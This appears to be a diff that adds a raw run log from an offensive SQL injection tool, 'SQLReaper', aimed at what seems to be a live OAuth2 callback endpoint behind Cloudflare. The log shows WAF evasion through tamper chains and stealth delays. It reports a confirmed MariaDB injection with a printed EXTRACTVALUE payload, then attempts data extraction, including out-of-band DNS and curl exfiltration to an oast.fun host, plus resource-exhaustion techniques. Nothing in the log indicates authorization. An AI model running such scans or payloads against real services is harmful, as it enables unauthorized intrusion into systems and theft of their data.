@@ -1,0 +1,279 @@
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 04:25:15 url='/oauth2/callback&re
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[!] StealthEngine: blocking detected, delay  1.2s
+[!] StealthEngine: blocking detected, delay  3.1s
+[!] StealthEngine: blocking detected, delay  7.8s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: 5 consecutive max-delay blocks — WAF not responding to delay strategy. Permanently disabling backoff, delay fixed at 0.5s (BUG-V198-STEALTH-SAWTOOTH FIX)
+[+] ML WAF fingerprint: Cloudflare (conf=0.94, probes=5, votes={'Cloudflare': 5})
+[+] ML WAF: Cloudflare
+[+] [v19] WAFMLBypassGenerator activated (WAF=Cloudflare, waf_bypass=5)
+[+] Safe-mode verification:
+ Ready to scan [oracle=timing_only]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   403/WAF  TIMING_ONLY oracle (sleep delay detected)
+   Use --playwright to handle JS challenge, or resolve manually
+[+] [OracleMode] Selected: timing_only
+[+] Pre-scan verification OK
+[+] Jitter profile: mean=0ms std=0ms p99=0ms min_sleep=3.0s
+[!] Jitter profile recommends SLEEP(3.0s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 3.0s
+[+] [v19] Oracle mode confirmed: timing_only
+[*] [diag-cascade] _v14_cascade entered: url='/oauth2/callback&response_type'
+[+] KB tamper chain: ['case_expression', 'semantic_eq', 'space2dash', 'randomcase', 'versionedkeywords']
+[*] [diag-cascade] discovered params: [] markers=[]
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 6 DBMS × 10 categories × 0 params × 3 methods
+[*]  DBMSes   : ['MySQL', 'PostgreSQL', 'MSSQL', 'SQLite', 'Oracle', 'MariaDB']
+[*]  Params   : []
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 18000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: GET ...e+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM: (0 params, source=direct)
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+[+] Primary surface found nothing  expanding to bypass Cloudflare WAF
+[*] Launching 5 parallel surface scans: headers (14 injection points), path segments, JSON body, POST method, PUT method
+[*] [SURFACE] Testing 14 header injection points...
+[*] [SURFACE] Testing path segment injection...
+[+] Path segment injection: 1 segments in /oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:
+[*] [diag-surface] scan_surface called: surface='POST:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' params=['id']
+[+] Scanning surface: 'POST:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='id' already_confirmed=False
+[*] --- testing 'id' @ /oauth2/callback&response_type=code&rhlk
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'id'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[Gate]  All 12 optimizations enabled
+[*] [diag] entering try_all: param='id' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'id'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to WB,S,T,BT,NV,TH,EX,HQ,ST,HY (was ALL)
+[*] [diag-surface] scan_surface called: surface='PUT:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' params=['id']
+[+] Scanning surface: 'PUT:/oauth2/callback&response_type=code&rhlk=js&rrk=47&scope=profile+email&service=lso&state=GFB9c7cB8eg9KkivlallYLyvxk-lWL2sayXChlvAqQM:' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='id' already_confirmed=False
+[*] --- testing 'id' @ /oauth2/callback&response_type=code&rhlk
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'id'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[Gate]  All 12 optimizations enabled
+[*] [diag] entering try_all: param='id' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'id'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to WB,S,T,BT,NV,TH,EX,HQ,ST,HY (was ALL)
+[+] Path injection: segment 0 ('oauth2')
+[+] Path injection: segment 0 ('oauth2')
+[+] Path injection: segment 0 ('oauth2')
+[+] [SURFACE] Path detection: path:0:oauth2 [E] MySQL
+[*] PCV re-verifying [E] MySQL  checking error pattern reproducibility...
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/6]: MySQL        | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] MySQL base_tech_map non-empty: {'T': 3181, 'S': 3181, 'HQ': 3181, 'TH': 3181, 'BT': 3181, 'WB': 3181, 'NV': 3181, 'EX': 3181, 'HY': 3181, 'ST': 3181}
+    [T] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+[*] [diag] MySQL base_tech_map non-empty: {'T': 3181, 'S': 3181, 'HQ': 3181, 'TH': 3181, 'BT': 3181, 'WB': 3181, 'NV': 3181, 'EX': 3181, 'HY': 3181, 'ST': 3181}
+    [T] MySQL: 3181 payloads
+    [S] MySQL: 3181 payloads
+    [HQ] MySQL: 3181 payloads
+    [TH] MySQL: 3181 payloads
+    [BT] MySQL: 3181 payloads
+    [WB] MySQL: 3181 payloads
+    [NV] MySQL: 3181 payloads
+    [EX] MySQL: 3181 payloads
+    [HY] MySQL: 3181 payloads
+    [ST] MySQL: 3181 payloads
+[*] │   Testing 10 technique codes in order: ['ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S']
+[*] ├─ [6/10] MySQL › Standard   │ tech=ST   │ 634 base payloads (3181 expanded)
+[*] │   Testing 10 technique codes in order: ['ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S']
+[*] ├─ [6/10] MySQL › Standard   │ tech=ST   │ 634 base payloads (3181 expanded)
+[*] testing 'MySQL standard technique' (param='id' req#1)
+[*] testing 'MySQL standard technique' (param='id' req#2)
+[!] PCV FAILED [E] MySQL  error pattern not reproducible on re-probe
+[!] [SURFACE] Path PCV FAILED: path:0:oauth2  discarded
+[+] [SURFACE] Path detection: path:0:oauth2 [E] MariaDB
+[*] PCV re-verifying [E] MariaDB  checking error pattern reproducibility...
+[+] PCV CONFIRMED [E] MariaDB  error pattern reproduced, absent in baseline
+[+] [SURFACE] Path PCV PASSED: path:0:oauth2 
+[+] Vulnerability confirmed  param='path:0:oauth2' technique=E dbms=MariaDB
+[+] Technique : E  DBMS: MariaDB  Param: 'path:0:oauth2'
+[+] Payload   :  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,USER()))
+[+] [SURFACE] Path detection: path:0:oauth2 [E] TiDB
+[*] PCV re-verifying [E] TiDB  checking error pattern reproducibility...
+[*] [SURFACE] Header scan complete  no injections found
+[*] [diag] _try_technique: tech=ST dbms=MySQL templates=3181 → testing 636 payloads
+[*] [diag] _try_technique: tech=ST dbms=MySQL templates=3181 → testing 636 payloads
+[!] PCV FAILED [E] TiDB  error pattern in BOTH inject and clean (static content)
+[!] [SURFACE] Path PCV FAILED: path:0:oauth2  discarded
+    [CTX-bool] order_by: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+    [CTX-bool] numeric_where: sim_t=0.594 sim_f=0.594 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#3)
+    [CTX-bool] order_by: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+    [CTX-bool] numeric_where: sim_t=0.609 sim_f=0.609 gap=0.000 need=0.250  gap too small
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#4)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#5)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#6)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#7)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#8)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#9)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#10)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#11)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#12)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#13)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#14)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#15)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#16)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#17)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#18)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#19)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#20)
+[+] [DeobfDetect] WAF normalizes through: []
+[+] [DeobfDetect] Safe encoding layer: overlong_utf8
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#21)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#22)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#23)
+[+] [DeobfDetect] WAF normalizes through: []
+[+] [DeobfDetect] Safe encoding layer: overlong_utf8
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#24)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#25)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#26)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#27)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#28)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#29)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#30)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#31)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#32)
+[+] Surface 'JSON body' found 1 result(s)!
+[+] Processing 1 deferred extraction(s)...
+[+] DBMS: MariaDB (from detection, skipping fingerprint)
+[+] DBMS: MariaDB  (conf=92%)
+[*] [MultiVector] Probing extraction methods for MariaDB...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [ErrorExtract] Error-based detection - using conditional error extraction
+[+] [ErrorExtract] DBMS: MariaDB
+[+] [ErrorExtract] Using metadata - prefix='' suffix='-- -' (validated)
+[+] [ErrorExtract] Testing error message visibility...
+[!] [ErrorExtract] Primary error template failed
+[!] [ErrorExtract] ✗ Error messages filtered/suppressed by WAF
+[!] [ErrorExtract] Error visibility test failed — attempting extraction anyway (may encounter filtering or wrapped error messages)
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] EXTRACTION SUMMARY
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] Database: None
+[+] [ErrorExtract] User: None
+[+] [ErrorExtract] Version: N/A
+[+] [ErrorExtract] Dumps: 0 tables dumped
+[+] [ErrorExtract] ========================================
+[+] [ErrorExtract] No data extracted via error messages
+[+] [ErrorExtract] Attempting error oracle direct extraction fallback...
+[+] [ErrorExtract] Error oracle available — extracting via ConditionalErrorExtractor
+[+] [ErrorExtract] Error oracle version: ?
+[+] [ErrorExtract] version: ?
+[+] [ErrorExtract] Error oracle user: ?
+[+] [ErrorExtract] user: ?
+[+] [ErrorExtract] Error oracle database: ?
+[+] [ErrorExtract] database: ?
+[+] [ErrorExtract] Falling back to standard extraction methods...
+[+] [Inference] Detection payload: AND EXTRACTVALUE(0x0a,CONCAT(0x7e,USER()))
+[+] [Inference] DBMS: MariaDB | Tamper chain: ['case_expression', 'semantic_eq', 'space2dash', 'randomcase', 'versionedkeywords', 'mysql_backtick_wrap', 'versioned_nested', 'mysql_nchar_bypass', 'hex_entities']
+[+] [Inference] Template (boolean-append): AND EXTRACTVALUE(0x0a,CONCAT(0x7e,USER())) AND [INFERENCE]
+[+] [Inference] PATH injection: stripping URL-encoding tampers to prevent double-encoding of SQL operators in URL path
+[+] [Inference] No sleep value in detection payload — falling back to 3.0s (from config.time_sec)
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cleared stale progress: output/mse_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=3.0s)...
+[+] [Inference] Calibration 1: TRUE=414ms FALSE=463ms margin=-49ms
+[+] [Inference] Best margin: -49ms
+[+] [Inference] Body length differs but too small (523B = 0.4% on 140286B page)  dynamic noise, not oracle
+[+] [Inference] Body length differs but too small (63B = 0.0% on 138641B page)  dynamic noise, not oracle
+[+] [Inference] Body length differs but too small (189B = 0.1% on 138635B page)  dynamic noise, not oracle
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] Wasserstein mean=0.000 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=438ms (margin=-49ms)
+[!] [Inference] Timing oracle UNRELIABLE: margin=49ms < min=2400ms (CDN noise exceeds injection signal — timing extraction skipped)
+[+] [Inference] Timing unreliable but ConditionalErrorOracle available — switching to error-oracle extraction
+[+] [Inference]  Using ConditionalErrorOracle for extraction (status-code oracle, immune to CDN timing noise)
+[+] [Inference]  Basic info extracted!
+[+] [Inference] Basic info done  continuing to enumeration (dump/dbs/tables flags set)
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  xbjqhuntjvpuofmbqopgmptldpifgpoqd.oast.fun
+[!] [SideChannel] MariaDB OOB: only LOAD_FILE UNC payloads available and FILE privilege not confirmed by detection — attempting anyway (LOAD_FILE NULL→no DNS callback→silent no-op).
+[+] [SideChannel] Advanced DNS: load_file_unc
+[+] [SideChannel] HTTP exfil: sys_exec_curl
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload (raw/wire):  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,USER()))
+[+] [Direct] Detection payload (decoded): AND EXTRACTVALUE(0x0a,CONCAT(0x7e,USER()))
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel]  WAF trigger #0 skipped: TRUE429==FALSE429 (no differentiation)
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+^CTraceback (most recent call last):
+  File "/home/kali/Desktop/sqlreaper_v214.py", line 190397, in <module>
+    _main_thread.join()
+    ~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/threading.py", line 1094, in join
+    self._handle.join(timeout)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^
+KeyboardInterrupt
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+^CTraceback (most recent call last):
+  File "/usr/lib/python3.13/threading.py", line 1542, in _shutdown
+    _thread_shutdown()
+KeyboardInterrupt: 
